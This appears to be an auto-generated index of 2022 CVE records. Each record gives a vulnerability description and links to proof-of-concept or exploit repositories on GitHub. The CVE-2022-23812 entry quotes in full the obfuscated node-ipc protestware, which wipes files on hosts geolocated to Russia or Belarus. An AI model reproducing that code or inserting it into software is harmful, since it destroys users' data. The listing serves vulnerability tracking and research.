## CVE-2022-27251
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/TheCyberGeek/CVE-2022-27251](https://github.com/TheCyberGeek/CVE-2022-27251) :  ![starts](https://img.shields.io/github/stars/TheCyberGeek/CVE-2022-27251.svg) ![forks](https://img.shields.io/github/forks/TheCyberGeek/CVE-2022-27251.svg)

## CVE-2022-27226
 A CSRF issue in /api/crontab on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor's defined interval, leading to remote code execution, allowing the threat actor to gain filesystem access. In addition, if the router's default credentials aren't rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction.



- [https://github.com/SakuraSamuraii/ez-iRZ](https://github.com/SakuraSamuraii/ez-iRZ) :  ![starts](https://img.shields.io/github/stars/SakuraSamuraii/ez-iRZ.svg) ![forks](https://img.shields.io/github/forks/SakuraSamuraii/ez-iRZ.svg)

## CVE-2022-26503
 Deserialization of untrusted data in Veeam Agent for Windows 2.0, 2.1, 2.2, 3.0.2, 4.x, and 5.x allows local users to run arbitrary code with local system privileges.



- [https://github.com/sinsinology/CVE-2022-26503](https://github.com/sinsinology/CVE-2022-26503) :  ![starts](https://img.shields.io/github/stars/sinsinology/CVE-2022-26503.svg) ![forks](https://img.shields.io/github/forks/sinsinology/CVE-2022-26503.svg)

## CVE-2022-26159
 The auto-completion plugin in Ametys CMS before 4.5.0 allows a remote unauthenticated attacker to read documents such as plugins/web/service/search/auto-completion/&lt;domain&gt;/en.xml (and similar pathnames for other languages), which contain all characters typed by all users, including the content of private pages. For example, a private page may contain usernames, e-mail addresses, and possibly passwords.



- [https://github.com/p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML](https://github.com/p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML) :  ![starts](https://img.shields.io/github/stars/p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML.svg) ![forks](https://img.shields.io/github/forks/p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML.svg)

## CVE-2022-26158
 An issue was discovered in the web application in Cherwell Service Management (CSM) 10.2.3. It accepts and reflects arbitrary domains supplied via a client-controlled Host header. Injection of a malicious URL in the Host: header of the HTTP Request results in a 302 redirect to an attacker-controlled page.



- [https://github.com/l00neyhacker/CVE-2022-26158](https://github.com/l00neyhacker/CVE-2022-26158) :  ![starts](https://img.shields.io/github/stars/l00neyhacker/CVE-2022-26158.svg) ![forks](https://img.shields.io/github/forks/l00neyhacker/CVE-2022-26158.svg)

## CVE-2022-26157
 An issue was discovered in the web application in Cherwell Service Management (CSM) 10.2.3. The ASP.NET_Sessionid cookie is not protected by the Secure flag. This makes it prone to interception by an attacker if traffic is sent over unencrypted channels.



- [https://github.com/l00neyhacker/CVE-2022-26157](https://github.com/l00neyhacker/CVE-2022-26157) :  ![starts](https://img.shields.io/github/stars/l00neyhacker/CVE-2022-26157.svg) ![forks](https://img.shields.io/github/forks/l00neyhacker/CVE-2022-26157.svg)

## CVE-2022-26156
 An issue was discovered in the web application in Cherwell Service Management (CSM) 10.2.3. Injection of a malicious payload within the RelayState= parameter of the HTTP request body results in the hijacking of the form action. Form-action hijacking vulnerabilities arise when an application places user-supplied input into the action URL of an HTML form. An attacker can use this vulnerability to construct a URL that, if visited by another application user, will modify the action URL of a form to point to the attacker's server.



- [https://github.com/l00neyhacker/CVE-2022-26156](https://github.com/l00neyhacker/CVE-2022-26156) :  ![starts](https://img.shields.io/github/stars/l00neyhacker/CVE-2022-26156.svg) ![forks](https://img.shields.io/github/forks/l00neyhacker/CVE-2022-26156.svg)

## CVE-2022-26155
 An issue was discovered in the web application in Cherwell Service Management (CSM) 10.2.3. XSS can occur via a payload in the SAMLResponse parameter of the HTTP request body.



- [https://github.com/l00neyhacker/CVE-2022-26155](https://github.com/l00neyhacker/CVE-2022-26155) :  ![starts](https://img.shields.io/github/stars/l00neyhacker/CVE-2022-26155.svg) ![forks](https://img.shields.io/github/forks/l00neyhacker/CVE-2022-26155.svg)

## CVE-2022-25949
 The kernel mode driver kwatch3 of KINGSOFT Internet Security 9 Plus Version 2010.06.23.247 fails to properly handle crafted inputs, leading to stack-based buffer overflow.



- [https://github.com/tandasat/CVE-2022-25949](https://github.com/tandasat/CVE-2022-25949) :  ![starts](https://img.shields.io/github/stars/tandasat/CVE-2022-25949.svg) ![forks](https://img.shields.io/github/forks/tandasat/CVE-2022-25949.svg)

## CVE-2022-25943
 The installer of WPS Office for Windows versions prior to v11.2.0.10258 fails to configure properly the ACL for the directory where the service program is installed.



- [https://github.com/HadiMed/KINGSOFT-WPS-Office-LPE](https://github.com/HadiMed/KINGSOFT-WPS-Office-LPE) :  ![starts](https://img.shields.io/github/stars/HadiMed/KINGSOFT-WPS-Office-LPE.svg) ![forks](https://img.shields.io/github/forks/HadiMed/KINGSOFT-WPS-Office-LPE.svg)

## CVE-2022-25640
 In wolfSSL before 5.2.0, a TLS 1.3 server cannot properly enforce a requirement for mutual authentication. A client can simply omit the certificate_verify message from the handshake, and never present a certificate.



- [https://github.com/dim0x69/cve-2022-25640-exploit](https://github.com/dim0x69/cve-2022-25640-exploit) :  ![starts](https://img.shields.io/github/stars/dim0x69/cve-2022-25640-exploit.svg) ![forks](https://img.shields.io/github/forks/dim0x69/cve-2022-25640-exploit.svg)

## CVE-2022-25636
 net/netfilter/nf_dup_netdev.c in the Linux kernel 5.4 through 5.6.10 allows local users to gain privileges because of a heap out-of-bounds write. This is related to nf_tables_offload.



- [https://github.com/Bonfee/CVE-2022-25636](https://github.com/Bonfee/CVE-2022-25636) :  ![starts](https://img.shields.io/github/stars/Bonfee/CVE-2022-25636.svg) ![forks](https://img.shields.io/github/forks/Bonfee/CVE-2022-25636.svg)

## CVE-2022-25375
 An issue was discovered in drivers/usb/gadget/function/rndis.c in the Linux kernel before 5.16.10. The RNDIS USB gadget lacks validation of the size of the RNDIS_MSG_SET command. Attackers can obtain sensitive information from kernel memory.



- [https://github.com/szymonh/rndis-co](https://github.com/szymonh/rndis-co) :  ![starts](https://img.shields.io/github/stars/szymonh/rndis-co.svg) ![forks](https://img.shields.io/github/forks/szymonh/rndis-co.svg)

## CVE-2022-25265
 In the Linux kernel through 5.16.10, certain binary files may have the exec-all attribute if they were built in approximately 2003 (e.g., with GCC 3.2.2 and Linux kernel 2.4.20). This can cause execution of bytes located in supposedly non-executable regions of a file.



- [https://github.com/x0reaxeax/exec-prot-bypass](https://github.com/x0reaxeax/exec-prot-bypass) :  ![starts](https://img.shields.io/github/stars/x0reaxeax/exec-prot-bypass.svg) ![forks](https://img.shields.io/github/forks/x0reaxeax/exec-prot-bypass.svg)

## CVE-2022-25258
 An issue was discovered in drivers/usb/gadget/composite.c in the Linux kernel before 5.16.10. The USB Gadget subsystem lacks certain validation of interface OS descriptor requests (ones with a large array index and ones associated with NULL function pointer retrieval). Memory corruption might occur.



- [https://github.com/szymonh/d-os-descriptor](https://github.com/szymonh/d-os-descriptor) :  ![starts](https://img.shields.io/github/stars/szymonh/d-os-descriptor.svg) ![forks](https://img.shields.io/github/forks/szymonh/d-os-descriptor.svg)

## CVE-2022-25257
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/RobertDra/CVE-2022-25257](https://github.com/RobertDra/CVE-2022-25257) :  ![starts](https://img.shields.io/github/stars/RobertDra/CVE-2022-25257.svg) ![forks](https://img.shields.io/github/forks/RobertDra/CVE-2022-25257.svg)

- [https://github.com/polling-repo-continua/CVE-2022-25257](https://github.com/polling-repo-continua/CVE-2022-25257) :  ![starts](https://img.shields.io/github/stars/polling-repo-continua/CVE-2022-25257.svg) ![forks](https://img.shields.io/github/forks/polling-repo-continua/CVE-2022-25257.svg)

## CVE-2022-25256
 SAS Web Report Studio 4.4 allows XSS. /SASWebReportStudio/logonAndRender.do has two parameters: saspfs_request_backlabel_list and saspfs_request_backurl_list. The first one affects the content of the button placed in the top left. The second affects the page to which the user is directed after pressing the button, e.g., a malicious web page. In addition, the second parameter executes JavaScript, which means XSS is possible by adding a javascript: URL.



- [https://github.com/RobertDra/CVE-2022-25256](https://github.com/RobertDra/CVE-2022-25256) :  ![starts](https://img.shields.io/github/stars/RobertDra/CVE-2022-25256.svg) ![forks](https://img.shields.io/github/forks/RobertDra/CVE-2022-25256.svg)

## CVE-2022-25090
 Printix Secure Cloud Print Management through 1.3.1106.0 creates a temporary temp.ini file in a directory with insecure permissions, leading to privilege escalation because of a race condition.



- [https://github.com/ComparedArray/printix-CVE-2022-25090](https://github.com/ComparedArray/printix-CVE-2022-25090) :  ![starts](https://img.shields.io/github/stars/ComparedArray/printix-CVE-2022-25090.svg) ![forks](https://img.shields.io/github/forks/ComparedArray/printix-CVE-2022-25090.svg)

## CVE-2022-25089
 Printix Secure Cloud Print Management through 1.3.1106.0 incorrectly uses Privileged APIs to modify values in HKEY_LOCAL_MACHINE via UITasks.PersistentRegistryData.



- [https://github.com/ComparedArray/printix-CVE-2022-25089](https://github.com/ComparedArray/printix-CVE-2022-25089) :  ![starts](https://img.shields.io/github/stars/ComparedArray/printix-CVE-2022-25089.svg) ![forks](https://img.shields.io/github/forks/ComparedArray/printix-CVE-2022-25089.svg)

## CVE-2022-25064
 TP-LINK TL-WR840N(ES)_V6.20_180709 was discovered to contain a remote code execution (RCE) vulnerability via the function oal_wan6_setIpAddr.



- [https://github.com/Mr-xn/CVE-2022-25064](https://github.com/Mr-xn/CVE-2022-25064) :  ![starts](https://img.shields.io/github/stars/Mr-xn/CVE-2022-25064.svg) ![forks](https://img.shields.io/github/forks/Mr-xn/CVE-2022-25064.svg)

- [https://github.com/exploitwritter/CVE-2022-25064](https://github.com/exploitwritter/CVE-2022-25064) :  ![starts](https://img.shields.io/github/stars/exploitwritter/CVE-2022-25064.svg) ![forks](https://img.shields.io/github/forks/exploitwritter/CVE-2022-25064.svg)

## CVE-2022-25063
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/exploitwritter/CVE-2022-25063](https://github.com/exploitwritter/CVE-2022-25063) :  ![starts](https://img.shields.io/github/stars/exploitwritter/CVE-2022-25063.svg) ![forks](https://img.shields.io/github/forks/exploitwritter/CVE-2022-25063.svg)

## CVE-2022-25062
 TP-LINK TL-WR840N(ES)_V6.20_180709 was discovered to contain an integer overflow via the function dm_checkString. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted HTTP request.



- [https://github.com/exploitwritter/CVE-2022-25062](https://github.com/exploitwritter/CVE-2022-25062) :  ![starts](https://img.shields.io/github/stars/exploitwritter/CVE-2022-25062.svg) ![forks](https://img.shields.io/github/forks/exploitwritter/CVE-2022-25062.svg)

## CVE-2022-25061
 TP-LINK TL-WR840N(ES)_V6.20_180709 was discovered to contain a command injection vulnerability via the component oal_setIp6DefaultRoute.



- [https://github.com/exploitwritter/CVE-2022-25061](https://github.com/exploitwritter/CVE-2022-25061) :  ![starts](https://img.shields.io/github/stars/exploitwritter/CVE-2022-25061.svg) ![forks](https://img.shields.io/github/forks/exploitwritter/CVE-2022-25061.svg)

## CVE-2022-25060
 TP-LINK TL-WR840N(ES)_V6.20_180709 was discovered to contain a command injection vulnerability via the component oal_startPing.



- [https://github.com/exploitwritter/CVE-2022-25060](https://github.com/exploitwritter/CVE-2022-25060) :  ![starts](https://img.shields.io/github/stars/exploitwritter/CVE-2022-25060.svg) ![forks](https://img.shields.io/github/forks/exploitwritter/CVE-2022-25060.svg)

## CVE-2022-25022
 A cross-site scripting (XSS) vulnerability in Htmly v2.8.1 allows attackers to excute arbitrary web scripts HTML via a crafted payload in the content field of a blog post.



- [https://github.com/MoritzHuppert/CVE-2022-25022](https://github.com/MoritzHuppert/CVE-2022-25022) :  ![starts](https://img.shields.io/github/stars/MoritzHuppert/CVE-2022-25022.svg) ![forks](https://img.shields.io/github/forks/MoritzHuppert/CVE-2022-25022.svg)

## CVE-2022-25020
 A cross-site scripting (XSS) vulnerability in Pluxml v5.8.7 allows attackers to execute arbitrary web scripts or HTML via a crafted payload in the thumbnail path of a blog post.



- [https://github.com/MoritzHuppert/CVE-2022-25020](https://github.com/MoritzHuppert/CVE-2022-25020) :  ![starts](https://img.shields.io/github/stars/MoritzHuppert/CVE-2022-25020.svg) ![forks](https://img.shields.io/github/forks/MoritzHuppert/CVE-2022-25020.svg)

## CVE-2022-25018
 Pluxml v5.8.7 was discovered to allow attackers to execute arbitrary code via crafted PHP code inserted into static pages.



- [https://github.com/MoritzHuppert/CVE-2022-25018](https://github.com/MoritzHuppert/CVE-2022-25018) :  ![starts](https://img.shields.io/github/stars/MoritzHuppert/CVE-2022-25018.svg) ![forks](https://img.shields.io/github/forks/MoritzHuppert/CVE-2022-25018.svg)

## CVE-2022-24990
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/lishang520/CVE-2022-24990](https://github.com/lishang520/CVE-2022-24990) :  ![starts](https://img.shields.io/github/stars/lishang520/CVE-2022-24990.svg) ![forks](https://img.shields.io/github/forks/lishang520/CVE-2022-24990.svg)

- [https://github.com/Jaky5155/CVE-2022-24990-TerraMaster-TOS--PHP-](https://github.com/Jaky5155/CVE-2022-24990-TerraMaster-TOS--PHP-) :  ![starts](https://img.shields.io/github/stars/Jaky5155/CVE-2022-24990-TerraMaster-TOS--PHP-.svg) ![forks](https://img.shields.io/github/forks/Jaky5155/CVE-2022-24990-TerraMaster-TOS--PHP-.svg)

- [https://github.com/VVeakee/CVE-2022-24990-POC](https://github.com/VVeakee/CVE-2022-24990-POC) :  ![starts](https://img.shields.io/github/stars/VVeakee/CVE-2022-24990-POC.svg) ![forks](https://img.shields.io/github/forks/VVeakee/CVE-2022-24990-POC.svg)

- [https://github.com/VVeakee/CVE-2022-24990-EXP](https://github.com/VVeakee/CVE-2022-24990-EXP) :  ![starts](https://img.shields.io/github/stars/VVeakee/CVE-2022-24990-EXP.svg) ![forks](https://img.shields.io/github/forks/VVeakee/CVE-2022-24990-EXP.svg)

## CVE-2022-24693
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/lukejenkins/CVE-2022-24693](https://github.com/lukejenkins/CVE-2022-24693) :  ![starts](https://img.shields.io/github/stars/lukejenkins/CVE-2022-24693.svg) ![forks](https://img.shields.io/github/forks/lukejenkins/CVE-2022-24693.svg)

## CVE-2022-24644
 ZZ Inc. KeyMouse Windows 3.08 and prior is affected by a remote code execution vulnerability during an unauthenticated update. To exploit this vulnerability, a user must trigger an update of an affected installation of KeyMouse.



- [https://github.com/gerr-re/cve-2022-24644](https://github.com/gerr-re/cve-2022-24644) :  ![starts](https://img.shields.io/github/stars/gerr-re/cve-2022-24644.svg) ![forks](https://img.shields.io/github/forks/gerr-re/cve-2022-24644.svg)

## CVE-2022-24354
 This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link AC1750 prior to 1.1.4 Build 20211022 rel.59103(5553) routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the NetUSB.ko module. The issue results from the lack of proper validation of user-supplied data, which can result in an integer overflow before allocating a buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-15835.



- [https://github.com/0vercl0k/zenith](https://github.com/0vercl0k/zenith) :  ![starts](https://img.shields.io/github/stars/0vercl0k/zenith.svg) ![forks](https://img.shields.io/github/forks/0vercl0k/zenith.svg)

## CVE-2022-24348
 Argo CD before 2.1.9 and 2.2.x before 2.2.4 allows directory traversal related to Helm charts because of an error in helmTemplate in repository.go. For example, an attacker may be able to discover credentials stored in a YAML file.



- [https://github.com/jkroepke/CVE-2022-24348-2](https://github.com/jkroepke/CVE-2022-24348-2) :  ![starts](https://img.shields.io/github/stars/jkroepke/CVE-2022-24348-2.svg) ![forks](https://img.shields.io/github/forks/jkroepke/CVE-2022-24348-2.svg)

## CVE-2022-24126
 A buffer overflow in the NRSessionSearchResult parser in Bandai Namco FromSoftware Dark Souls III through 2022-03-19 allows remote attackers to execute arbitrary code via matchmaking servers, a different vulnerability than CVE-2021-34170.



- [https://github.com/tremwil/ds3-nrssr-rce](https://github.com/tremwil/ds3-nrssr-rce) :  ![starts](https://img.shields.io/github/stars/tremwil/ds3-nrssr-rce.svg) ![forks](https://img.shields.io/github/forks/tremwil/ds3-nrssr-rce.svg)

## CVE-2022-24125
 The matchmaking servers of Bandai Namco FromSoftware Dark Souls III through 2022-03-19 allow remote attackers to send arbitrary push requests to clients via a RequestSendMessageToPlayers request. For example, ability to send a push message to hundreds of thousands of machines is only restricted on the client side, and can thus be bypassed with a modified client.



- [https://github.com/tremwil/ds3-nrssr-rce](https://github.com/tremwil/ds3-nrssr-rce) :  ![starts](https://img.shields.io/github/stars/tremwil/ds3-nrssr-rce.svg) ![forks](https://img.shields.io/github/forks/tremwil/ds3-nrssr-rce.svg)

## CVE-2022-24124
 The query API in Casdoor before 1.13.1 has a SQL injection vulnerability related to the field and value parameters, as demonstrated by api/get-organizations.



- [https://github.com/ColdFusionX/CVE-2022-24124](https://github.com/ColdFusionX/CVE-2022-24124) :  ![starts](https://img.shields.io/github/stars/ColdFusionX/CVE-2022-24124.svg) ![forks](https://img.shields.io/github/forks/ColdFusionX/CVE-2022-24124.svg)

## CVE-2022-24122
 kernel/ucount.c in the Linux kernel 5.14 through 5.16.4, when unprivileged user namespaces are enabled, allows a use-after-free and privilege escalation because a ucounts object can outlive its namespace.



- [https://github.com/meowmeowxw/CVE-2022-24122](https://github.com/meowmeowxw/CVE-2022-24122) :  ![starts](https://img.shields.io/github/stars/meowmeowxw/CVE-2022-24122.svg) ![forks](https://img.shields.io/github/forks/meowmeowxw/CVE-2022-24122.svg)

## CVE-2022-24112
 An attacker can abuse the batch-requests plugin to send requests to bypass the IP restriction of Admin API. A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution. When the admin key was changed or the port of Admin API was changed to a port different from the data panel, the impact is lower. But there is still a risk to bypass the IP restriction of Apache APISIX's data panel. There is a check in the batch-requests plugin which overrides the client IP with its real remote IP. But due to a bug in the code, this check can be bypassed.



- [https://github.com/Mr-xn/CVE-2022-24112](https://github.com/Mr-xn/CVE-2022-24112) :  ![starts](https://img.shields.io/github/stars/Mr-xn/CVE-2022-24112.svg) ![forks](https://img.shields.io/github/forks/Mr-xn/CVE-2022-24112.svg)

- [https://github.com/Udyz/CVE-2022-24112](https://github.com/Udyz/CVE-2022-24112) :  ![starts](https://img.shields.io/github/stars/Udyz/CVE-2022-24112.svg) ![forks](https://img.shields.io/github/forks/Udyz/CVE-2022-24112.svg)

- [https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112](https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112) :  ![starts](https://img.shields.io/github/stars/M4xSec/Apache-APISIX-CVE-2022-24112.svg) ![forks](https://img.shields.io/github/forks/M4xSec/Apache-APISIX-CVE-2022-24112.svg)

- [https://github.com/Axx8/CVE-2022-24112](https://github.com/Axx8/CVE-2022-24112) :  ![starts](https://img.shields.io/github/stars/Axx8/CVE-2022-24112.svg) ![forks](https://img.shields.io/github/forks/Axx8/CVE-2022-24112.svg)

- [https://github.com/shakeman8/CVE-2022-24112](https://github.com/shakeman8/CVE-2022-24112) :  ![starts](https://img.shields.io/github/stars/shakeman8/CVE-2022-24112.svg) ![forks](https://img.shields.io/github/forks/shakeman8/CVE-2022-24112.svg)

- [https://github.com/Mah1ndra/CVE-2022-24112](https://github.com/Mah1ndra/CVE-2022-24112) :  ![starts](https://img.shields.io/github/stars/Mah1ndra/CVE-2022-24112.svg) ![forks](https://img.shields.io/github/forks/Mah1ndra/CVE-2022-24112.svg)

- [https://github.com/twseptian/cve-2022-24112](https://github.com/twseptian/cve-2022-24112) :  ![starts](https://img.shields.io/github/stars/twseptian/cve-2022-24112.svg) ![forks](https://img.shields.io/github/forks/twseptian/cve-2022-24112.svg)

- [https://github.com/kavishkagihan/CVE-2022-24112-POC](https://github.com/kavishkagihan/CVE-2022-24112-POC) :  ![starts](https://img.shields.io/github/stars/kavishkagihan/CVE-2022-24112-POC.svg) ![forks](https://img.shields.io/github/forks/kavishkagihan/CVE-2022-24112-POC.svg)

## CVE-2022-24087
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/Sam00rx/CVE-2022-24087](https://github.com/Sam00rx/CVE-2022-24087) :  ![starts](https://img.shields.io/github/stars/Sam00rx/CVE-2022-24087.svg) ![forks](https://img.shields.io/github/forks/Sam00rx/CVE-2022-24087.svg)

## CVE-2022-24086
 Adobe Commerce versions 2.4.3-p1 (and earlier) and 2.3.7-p2 (and earlier) are affected by an improper input validation vulnerability during the checkout process. Exploitation of this issue does not require user interaction and could result in arbitrary code execution.



- [https://github.com/Mr-xn/CVE-2022-24086](https://github.com/Mr-xn/CVE-2022-24086) :  ![starts](https://img.shields.io/github/stars/Mr-xn/CVE-2022-24086.svg) ![forks](https://img.shields.io/github/forks/Mr-xn/CVE-2022-24086.svg)

- [https://github.com/shakeman8/CVE-2022-24086-RCE](https://github.com/shakeman8/CVE-2022-24086-RCE) :  ![starts](https://img.shields.io/github/stars/shakeman8/CVE-2022-24086-RCE.svg) ![forks](https://img.shields.io/github/forks/shakeman8/CVE-2022-24086-RCE.svg)

- [https://github.com/k0zulzr/CVE-2022-24086-RCE](https://github.com/k0zulzr/CVE-2022-24086-RCE) :  ![starts](https://img.shields.io/github/stars/k0zulzr/CVE-2022-24086-RCE.svg) ![forks](https://img.shields.io/github/forks/k0zulzr/CVE-2022-24086-RCE.svg)

- [https://github.com/Sam00rx/CVE-2022-24087](https://github.com/Sam00rx/CVE-2022-24087) :  ![starts](https://img.shields.io/github/stars/Sam00rx/CVE-2022-24087.svg) ![forks](https://img.shields.io/github/forks/Sam00rx/CVE-2022-24087.svg)

## CVE-2022-24032
 Adenza AxiomSL ControllerView through 10.8.1 is vulnerable to user enumeration. An attacker can identify valid usernames on the platform because a failed login attempt produces a different error message when the username is valid.



- [https://github.com/jdordonezn/CVE-2022-24032](https://github.com/jdordonezn/CVE-2022-24032) :  ![starts](https://img.shields.io/github/stars/jdordonezn/CVE-2022-24032.svg) ![forks](https://img.shields.io/github/forks/jdordonezn/CVE-2022-24032.svg)

## CVE-2022-23967
 In TightVNC 1.3.10, there is an integer signedness error and resultant heap-based buffer overflow in InitialiseRFBConnection in rfbproto.c (for the vncviewer component). There is no check on the size given to malloc, e.g., -1 is accepted. This allocates a chunk of size zero, which will give a heap pointer. However, one can send 0xffffffff bytes of data, which can have a DoS impact or lead to remote code execution.



- [https://github.com/MaherAzzouzi/CVE-2022-23967](https://github.com/MaherAzzouzi/CVE-2022-23967) :  ![starts](https://img.shields.io/github/stars/MaherAzzouzi/CVE-2022-23967.svg) ![forks](https://img.shields.io/github/forks/MaherAzzouzi/CVE-2022-23967.svg)

## CVE-2022-23940
 SuiteCRM through 7.12.1 and 8.x through 8.0.1 allows Remote Code Execution. Authenticated users with access to the Scheduled Reports module can achieve this by leveraging PHP deserialization in the email_recipients property. By using a crafted request, they can create a malicious report, containing a PHP-deserialization payload in the email_recipients field. Once someone accesses this report, the backend will deserialize the content of the email_recipients field and the payload gets executed. Project dependencies include a number of interesting PHP deserialization gadgets (e.g., Monolog/RCE1 from phpggc) that can be used for Code Execution.



- [https://github.com/manuelz120/CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940) :  ![starts](https://img.shields.io/github/stars/manuelz120/CVE-2022-23940.svg) ![forks](https://img.shields.io/github/forks/manuelz120/CVE-2022-23940.svg)

## CVE-2022-23812
 This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from &quot;path&quot;; import a from &quot;fs&quot;; import o from &quot;https&quot;; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t &gt; 1) { return; } const n = Buffer.from(&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;, &quot;base64&quot;); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(&quot;utf8&quot;), function (t) { t.on(&quot;data&quot;, function (t) { const n = Buffer.from(&quot;Li8=&quot;, &quot;base64&quot;); const o = Buffer.from(&quot;Li4v&quot;, &quot;base64&quot;); const r = Buffer.from(&quot;Li4vLi4v&quot;, &quot;base64&quot;); const f = Buffer.from(&quot;Lw==&quot;, &quot;base64&quot;); const c = Buffer.from(&quot;Y291bnRyeV9uYW1l&quot;, &quot;base64&quot;); const e = Buffer.from(&quot;cnVzc2lh&quot;, &quot;base64&quot;); const i = Buffer.from(&quot;YmVsYXJ1cw==&quot;, &quot;base64&quot;); try { const s = JSON.parse(t.toString(&quot;utf8&quot;)); const u = s[c.toString(&quot;utf8&quot;)].toLowerCase(); const a = u.includes(e.toString(&quot;utf8&quot;)) || u.includes(i.toString(&quot;utf8&quot;)); // checks if country is Russia or Belarus if (a) { h(n.toString(&quot;utf8&quot;)); h(o.toString(&quot;utf8&quot;)); h(r.toString(&quot;utf8&quot;)); h(f.toString(&quot;utf8&quot;)); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = &quot;&quot;, o = &quot;&quot;) { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from(&quot;4p2k77iP&quot;, &quot;base64&quot;); for (var e = 0; e &lt; r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length &gt; 0 ? f.push(...s) : null; } else if (i.indexOf(o) &gt;= 0) { try { a.writeFile(i, c.toString(&quot;utf8&quot;), function () {}); // overwrites file with &#10084;&#65039; } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };



- [https://github.com/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812](https://github.com/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812) :  ![starts](https://img.shields.io/github/stars/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812.svg) ![forks](https://img.shields.io/github/forks/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812.svg)

## CVE-2022-23808
 An issue was discovered in phpMyAdmin 5.1 before 5.1.2. An attacker can inject malicious code into aspects of the setup script, which can allow XSS or HTML injection.



- [https://github.com/dipakpanchal456/CVE-2022-23808](https://github.com/dipakpanchal456/CVE-2022-23808) :  ![starts](https://img.shields.io/github/stars/dipakpanchal456/CVE-2022-23808.svg) ![forks](https://img.shields.io/github/forks/dipakpanchal456/CVE-2022-23808.svg)

## CVE-2022-23779
 Zoho ManageEngine Desktop Central before 10.1.2137.8 exposes the installed server name to anyone. The internal hostname can be discovered by reading HTTP redirect responses.



- [https://github.com/fbusr/CVE-2022-23779](https://github.com/fbusr/CVE-2022-23779) :  ![starts](https://img.shields.io/github/stars/fbusr/CVE-2022-23779.svg) ![forks](https://img.shields.io/github/forks/fbusr/CVE-2022-23779.svg)

## CVE-2022-23731
 V8 javascript engine (heap vulnerability) can cause privilege escalation ,which can impact on some webOS TV models.



- [https://github.com/DavidBuchanan314/WAMpage](https://github.com/DavidBuchanan314/WAMpage) :  ![starts](https://img.shields.io/github/stars/DavidBuchanan314/WAMpage.svg) ![forks](https://img.shields.io/github/forks/DavidBuchanan314/WAMpage.svg)

## CVE-2022-23727
 There is a privilege escalation vulnerability in some webOS TVs. Due to wrong setting environments, local attacker is able to perform specific operation to exploit this vulnerability. Exploitation may cause the attacker to obtain a higher privilege



- [https://github.com/RootMyTV/RootMyTV.github.io](https://github.com/RootMyTV/RootMyTV.github.io) :  ![starts](https://img.shields.io/github/stars/RootMyTV/RootMyTV.github.io.svg) ![forks](https://img.shields.io/github/forks/RootMyTV/RootMyTV.github.io.svg)

## CVE-2022-23378
 A Cross-Site Scripting (XSS) vulnerability exists within the 3.2.2 version of TastyIgniter. The &quot;items%5B0%5D%5Bpath%5D&quot; parameter of a request made to /admin/allergens/edit/1 is vulnerable.



- [https://github.com/TheGetch/CVE-2022-23378](https://github.com/TheGetch/CVE-2022-23378) :  ![starts](https://img.shields.io/github/stars/TheGetch/CVE-2022-23378.svg) ![forks](https://img.shields.io/github/forks/TheGetch/CVE-2022-23378.svg)

## CVE-2022-23361
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/ViNi0608/CVE-2022-23361](https://github.com/ViNi0608/CVE-2022-23361) :  ![starts](https://img.shields.io/github/stars/ViNi0608/CVE-2022-23361.svg) ![forks](https://img.shields.io/github/forks/ViNi0608/CVE-2022-23361.svg)

## CVE-2022-23307
 CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.



